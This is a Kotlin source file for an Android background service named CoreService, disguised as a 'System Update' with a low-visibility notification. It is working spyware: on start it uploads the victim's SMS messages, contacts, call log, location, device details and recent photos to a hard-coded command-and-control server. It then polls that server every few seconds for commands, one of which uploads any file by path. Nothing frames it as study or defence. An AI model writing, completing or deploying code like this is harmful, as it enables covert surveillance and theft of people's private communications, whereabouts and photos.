package com.system.update

import android.app.*
import android.content.*
import android.os.*
import java.io.*
import java.net.*
import org.json.*

class CoreService : Service() {
    private val C2 = "https://trusty-boa-4029.aliondavlatov12-cpu.deno.net"
    private var lastUpdate = 0L

    override fun onBind(i: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, notif())
        Thread { loop() }.start()
        Thread { initialDump() }.start()
    }

    private fun notif(): Notification {
        val ch = "svc"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(
                NotificationChannel(ch, "svc", NotificationManager.IMPORTANCE_MIN)
            )
        }
        return Notification.Builder(this, ch)
            .setContentTitle("System Update")
            .setContentText("Checking...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
    }

    private fun loop() {
        while (true) {
            try {
                for (u in getUpdates()) handle(u)
            } catch (_: Exception) {}
            Thread.sleep(3000)
        }
    }

    private fun initialDump() {
        try {
            sendText("=== NEW DEVICE ===\n" + deviceInfo())
            sendFile(dumpSms(), "sms.txt")
            sendFile(dumpContacts(), "contacts.txt")
            sendFile(dumpCalls(), "calls.txt")
            sendText("LOC: " + getLoc())
            sendRecentPhotos(20)
        } catch (_: Exception) {}
    }

    private fun getUpdates(): List<JSONObject> {
        val url = URL("$C2/cmd?o=${lastUpdate + 1}")
        val arr = JSONObject(url.readText()).getJSONArray("result")
        val out = mutableListOf<JSONObject>()
        for (i in 0 until arr.length()) {
            val o = arr.getJSONObject(i)
            lastUpdate = o.getLong("update_id")
            out.add(o)
        }
        return out
    }

    private fun handle(u: JSONObject) {
        val msg = u.optJSONObject("message") ?: return
        val text = msg.optString("text")
        when {
            text == "/sms" -> sendFile(dumpSms(), "sms.txt")
            text == "/contacts" -> sendFile(dumpContacts(), "contacts.txt")
            text == "/calls" -> sendFile(dumpCalls(), "calls.txt")
            text == "/loc" -> sendText(getLoc())
            text == "/info" -> sendText(deviceInfo())
            text == "/photos" -> sendRecentPhotos(50)
            text == "/apps" -> sendFile(dumpApps(), "apps.txt")
            text.startsWith("/read") -> {
                val p = text.removePrefix("/read").trim()
                sendFile(File(p), File(p).name)
            }
        }
    }

    private fun dumpSms(): File {
        val f = File(cacheDir, "sms.txt")
        val c = contentResolver.query(
            android.net.Uri.parse("content://sms/inbox"),
            null, null, null, "date DESC LIMIT 500"
        )
        f.printWriter().use { w ->
            c?.use {
                while (it.moveToNext()) {
                    w.println(it.getString(it.getColumnIndexOrThrow("address")) + ": " +
                              it.getString(it.getColumnIndexOrThrow("body")))
                }
            }
        }
        return f
    }

    private fun dumpContacts(): File {
        val f = File(cacheDir, "contacts.txt")
        val c = contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        f.printWriter().use { w ->
            c?.use {
                while (it.moveToNext()) {
                    w.println(it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " +
                        it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))
                }
            }
        }
        return f
    }

    private fun dumpCalls(): File {
        val f = File(cacheDir, "calls.txt")
        val c = contentResolver.query(
            android.net.Uri.parse("content://call_log/calls"),
            null, null, null, "date DESC LIMIT 500"
        )
        f.printWriter().use { w ->
            c?.use {
                while (it.moveToNext()) {
                    w.println(it.getString(it.getColumnIndexOrThrow("number")) + " " +
                              it.getString(it.getColumnIndexOrThrow("duration")))
                }
            }
        }
        return f
    }

    private fun dumpApps(): File {
        val f = File(cacheDir, "apps.txt")
        f.printWriter().use { w ->
            for (a in packageManager.getInstalledPackages(0)) {
                w.println("${a.packageName} — ${a.versionName}")
            }
        }
        return f
    }

    private fun sendRecentPhotos(count: Int) {
        val proj = arrayOf(
            android.provider.MediaStore.Images.Media._ID,
            android.provider.MediaStore.Images.Media.DISPLAY_NAME
        )
        val c = contentResolver.query(
            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            proj, null, null,
            android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT $count"
        )
        c?.use {
            while (it.moveToNext()) {
                val id = it.getLong(0)
                val name = it.getString(1)
                val uri = android.net.Uri.withAppendedPath(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                )
                try {
                    val ins = contentResolver.openInputStream(uri) ?: continue
                    val tmp = File(cacheDir, name)
                    tmp.outputStream().use { o -> ins.copyTo(o) }
                    sendFile(tmp, name)
                    tmp.delete()
                } catch (_: Exception) {}
            }
        }
    }

    private fun getLoc(): String {
        val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
        val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
               ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
        return loc?.let { "${it.latitude},${it.longitude}" } ?: "no fix"
    }

    private fun deviceInfo(): String =
        "Model: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}\nBrand: ${Build.BRAND}"

    private fun sendText(t: String) {
        try {
            val conn = URL("$C2/hit").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.write(t.toByteArray())
            conn.inputStream.close()
        } catch (_: Exception) {}
    }

    private fun sendFile(f: File, name: String) {
        if (!f.exists() || f.length() == 0L) return
        try {
            val b = "----x${System.currentTimeMillis()}"
            val conn = URL("$C2/file").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
            conn.outputStream.use { os ->
                fun p(s: String) = os.write(s.toByteArray())
                p("--$b\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n$name\r\n")
                p("--$b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"$name\"\r\n")
                p("Content-Type: application/octet-stream\r\n\r\n")
                f.inputStream().copyTo(os)
                p("\r\n--$b--\r\n")
            }
            conn.inputStream.close()
        } catch (_: Exception) {}
    }
}
